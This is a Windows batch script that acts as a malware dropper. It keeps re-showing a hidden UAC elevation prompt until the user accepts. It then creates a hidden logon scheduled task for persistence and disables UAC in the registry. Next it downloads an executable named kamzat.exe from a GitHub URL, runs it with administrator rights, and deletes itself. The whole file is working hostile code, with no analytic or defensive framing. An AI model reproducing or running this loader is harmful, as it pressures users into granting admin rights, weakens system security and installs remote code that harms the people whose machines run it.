@echo off
setlocal enabledelayedexpansion

:: Check if the script is running with administrator privileges
NET SESSION >nul 2>&1
if %errorlevel% equ 0 (
    goto :admin_tasks
)

:loop
    :: Trigger the UAC prompt using PowerShell from within the batch file
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList '/elevated' -Verb RunAs -WindowStyle Hidden" >nul 2>&1

    :: If user declines the UAC prompt, retry
    if %errorlevel% neq 0 (
        timeout /t 3 >nul
        goto :loop
    )
    exit /b

:admin_tasks
:: Create scheduled task for persistence FIRST
schtasks /create /tn "Runtime Management Agent" /tr "\"%APPDATA%\SubDir\Service Runtime Management Agent.exe\"" /sc onlogon /delay 0002:00 /rl highest /f

:: Disable UAC through registry
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1

:: Download the file from GitHub to TEMP
powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe' -OutFile '%TEMP%\kamzat.exe' -UseBasicParsing } catch { exit 1 }"

:: Verify download completion and execute
if exist "%TEMP%\kamzat.exe" (
    :: Ensure the file is fully downloaded by checking its accessibility
    type nul >> "%TEMP%\kamzat.exe" 2>nul && (
        :: Run the downloaded file WITH ADMIN RIGHTS (current batch already has admin rights)
        "%TEMP%\kamzat.exe"
        
        :: Wait briefly to ensure the file has started
        ping -n 3 127.0.0.1 >nul
        
        :: Cleanup - remove the batch file itself
        del "%~f0" >nul 2>&1
    )
)

exit /b
